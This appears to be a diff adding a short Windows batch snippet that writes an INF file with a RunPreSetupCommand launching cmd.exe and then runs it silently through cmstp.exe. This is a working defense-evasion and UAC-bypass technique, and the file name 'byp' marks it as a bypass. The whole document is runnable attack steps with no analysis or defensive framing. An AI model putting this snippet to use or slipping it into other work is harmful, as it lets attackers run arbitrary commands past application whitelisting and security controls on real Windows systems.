@@ -1,0 +1,10 @@
+     #1. Create INF file
+echo [version] > C:\temp\byp.inf 
+echo Signature=$chicago$ >> C:\temp\byp.inf
+echo [DefaultInstall] >> C:\temp\byp.inf
+echo RunPreSetupCommand=Task >> C:\temp\byp.inf
+echo [Task] >> C:\temp\byp.inf
+echo C:\Windows\System32\cmd.exe >> C:\temp\byp.inf
+
+    #2 Start
+cmstp.exe /s C:\temp\byp.inf
